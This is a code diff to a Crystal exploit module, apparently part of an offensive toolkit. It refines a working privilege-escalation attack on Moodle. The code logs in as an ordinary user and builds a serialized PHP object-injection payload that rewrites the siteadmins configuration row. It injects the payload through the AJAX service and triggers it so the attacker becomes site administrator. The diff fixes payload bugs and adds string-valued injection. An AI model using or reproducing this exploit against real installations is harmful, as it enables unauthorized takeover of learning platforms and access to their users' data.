@@ -24,11 +24,11 @@ module TMoodleActions
       psw = gets().not_nil!
       sess_info = SessionInfo.new
       moodle_session = sess_info.get_session(url, username, psw)
-      puts "[?] Enter your user id"
       user_id = get_user_id(url, moodle_session["moodle_session"])
+      puts "[*] User id: " + user_id.to_s
       puts "[>] Executing attack..."
-      execute(url, moodle_session["moodle_session"], moodle_session["sess_key"], value: user_id)
-      puts "[*] You should now be an administrator."
+      execute(url, moodle_session["moodle_session"], moodle_session["session_key"], value: user_id)
+      puts "[***] You should now be an administrator."
     end
 
     def get_user_id(url, moodle_session)
@@ -37,7 +37,7 @@ module TMoodleActions
       return user_id.not_nil!.to_i
     end
 
-    def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value = 3)
+    def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value : (Number | String) = 3)
       # table = "config" # table to update
       # row_id = 25      # row id to insert into. 25 is the row that sets the "siteadmins" parameter. could vary from installation to installation
       # column = "value" # column name to update, which holds the userid
@@ -55,11 +55,11 @@ module TMoodleActions
       # reset the sortorder so we can see the front page again without the payload triggering
       data = {"sesskey" => sess_key, "sortorder[]" => "1"}
       puts "[*] Resetting sort order to prevent retriggering payload..."
-      puts http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false).body
+      http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false)
 
       # force plugincheck so we can access admin panel
       puts "[*] Activating admin panel..."
-      puts http_get(url + "/admin/index.php?cache=0&confirmplugincheck=1", moodle_session).body
+      http_get(url + "/admin/index.php?cache=0&confirmplugincheck=1", moodle_session)
     end
 
     private def http_post(url, data : String, moodle_session, json)
@@ -103,22 +103,38 @@ module TMoodleActions
       # below is a serialized PHP object
       table_name_length = table.bytesize
       column_name_length = column.bytesize
-      value = "a:2:{i:0;a:1:{" \
-              "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
-              "i:1;O:40:\"gradereport_singleview\\local\\u\\feedback\":1:{" \
-              "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
-              "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
-              "s:11:\"calculation\";" \
-              "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
-              "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
-              "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
-              "i:#{value};s:8:\"d_fields\";a:2:{" \
-              "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}};"
+
+      if value.is_a?(Number)
+        payload = "a:2:{i:0;a:1:{" \
+                  "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
+                  "i:1;O:40:\"gradereport_singleview\\local\\ui\\feedback\":1:{" \
+                  "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
+                  "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
+                  "s:11:\"calculation\";" \
+                  "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
+                  "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
+                  "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
+                  "i:#{value};s:15:\"required_fields\";a:2:{" \
+                  "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}}"
+      elsif value.is_a?(String)
+        value_length = value.bytesize
+        payload = "a:2:{i:0;a:1:{" \
+                  "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
+                  "i:1;O:40:\"gradereport_singleview\\local\\ui\\feedback\":1:{" \
+                  "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
+                  "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
+                  "s:11:\"calculation\";" \
+                  "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
+                  "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
+                  "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
+                  "s:#{value_length}:\"#{value}\";s:15:\"required_fields\";a:2:{" \
+                  "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}}"
+      end
+
       #   we"ll set the course_blocks sortorder to 0 so we default to legacy user preference
       data = {"sesskey" => sess_key, "sortorder[]" => "0"}
-      puts data
       puts "[>] Setting course_blocks sortorder..."
-      puts http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false).body
+      http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false)
 
       #    injecting the payload
 
@@ -134,7 +150,7 @@ module TMoodleActions
                   json.array do
                     json.object do
                       json.field "type", "course_overview_course_order"
-                      json.field "value", value
+                      json.field "value", payload
                     end
                   end
                 end
@@ -146,11 +162,11 @@ module TMoodleActions
 
       #     httpPost($url..$sesskey, $data, $MoodleSession,1);
       puts "[>] Injecting payload..."
-      puts http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", string.to_s, moodle_session, true).body
+      http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", string.to_s, moodle_session, true)
 
       #     getting the frontpage so the payload will activate
       puts "[>] Activating payload"
-      puts http_get(url + "/my/", moodle_session).body
+      http_get(url + "/my/", moodle_session)
     end
   end
 end
